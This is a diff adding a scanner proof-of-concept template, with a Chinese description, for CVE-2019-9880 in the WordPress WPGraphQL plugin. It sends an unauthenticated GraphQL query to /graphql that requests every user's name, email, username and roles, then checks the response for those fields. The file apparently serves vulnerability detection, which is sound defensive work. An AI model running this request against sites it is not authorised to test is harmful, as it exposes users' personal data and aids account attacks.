@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "通过向 WordPress 的 /graphql 端点发送 GraphQL 查询请求，未认证攻击者可获取所有 WordPress 用户的详细信息，包括用户名、邮箱、角色等敏感数据。"
+id = "POC-AVE-2019-0221"
+name = "WordPress WPGraphQL 未授权用户信息泄露 PoC"
+severity = "critical"
+tags = ["ave-2019-0221"]
+vuln_id = [
+    "CVE-2019-9880",
+    "AVE-2019-0221",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/graphql"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"query": "query { users { nodes { id name email username roles } } }"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"data":{',
+    '"name":',
+    '"roles":',
+]
